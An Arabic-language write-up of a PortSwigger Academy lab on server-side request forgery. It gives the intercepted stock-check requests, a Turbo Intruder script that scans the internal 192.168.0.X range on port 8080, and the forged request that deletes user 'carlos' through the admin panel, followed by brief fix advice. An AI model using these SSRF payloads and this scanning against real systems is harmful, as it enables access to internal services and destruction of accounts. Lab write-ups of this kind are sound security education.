# [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

## **`الهدف`**
استخدم خاصية `stock check` لفحص النطاق الداخلي `192.168.0.X` بحثًا عن واجهة إدارية على المنفذ `8080`، ثم استخدمها لحذف حساب `carlos`.
## **`خطوات الحل`**
==**`ملاحظة:`==** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

بعد الدخول إلى اللاب سنتوجه إلى أى منتج ونقوم بالضغط على `Check stock` وبعد ذلك سنجد في الـ `HTTP history` الـطلب التالي فسنقوم بتحويله إلى `Repeater`
```http
POST /product/stock HTTP/2
Host: 0ad8008d04079be080361c0f00e60025.web-security-academy.net
Cookie: session=XBZOQ8dImcvopPbvfV7GCiIPg3HxZ22K

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

ثم سنقوم بتعديل معلم الـ `StocApi` إلى `http://192.168.0.X:8080/admin` من داخل الـ `Inspector`
```http
POST /product/stock HTTP/2
Host: 0acc00cd046ae862800ba85a00f0001c.web-security-academy.net
Cookie: session=ANSuwsqLe0vMHh1ve0PS8Ecyj10Hw6kr

stockApi=http%3a%2f%2f192.168.0.X%3a8080%2fadmin
```
بعد ذلك سنقوم بتحويل الطلب إلى `Turbo Intruder`

وسنقوم بإستعمال سكريبت `Python` التالي، والذي سيقوم بتجربة جميع الأرقام من `0` وحتى `255` في الخانة الاخيرة من الـ `IP` والتي سنضع بها علامة `%s` بدل الـ `X`.

```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3, 
                           requestsPerConnection=20,
                           pipeline=False,    
                           engine=Engine.THREADED
                           )
    for i in range(256):
        code = '{:01d}'.format(i)
        engine.queue(target.req, code)

def handleResponse(req, interesting):
    table.add(req)
```

وسنجد أن الاستجابة صاحبة `IP` التالي صحيحة: `http://192.168.0.13:8080/admin` وأصبح لدينا وصول للوحة التحكم.
وبفحص الاستجابة سنجد أنه لحذف حساب `carlos` يجب أن نقوم بتعديل معلم الـ `StocApi` إلى `/admin/delete?username=carlos` من داخل الـ `Inspector`

لذلك سنعود إلى `repeater` ونقوم بتعديل معلم الـ `SockApi` إلى `http://192.168.0.13:8080/admin/delete?username=carlos` ونقوم بإرساله
```http
POST /product/stock HTTP/2
Host: 0acc00cd046ae862800ba85a00f0001c.web-security-academy.net
Cookie: session=ANSuwsqLe0vMHh1ve0PS8Ecyj10Hw6kr

stockApi=http%3a%2f%2f192.168.0.13%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
```
وبمجرد إرسال الطلب سنجد أن حساب `carlos` تم حذفه لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Basic SSRF against the local server](./Basic-SSRF-against-the-local-server.md)

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting`.
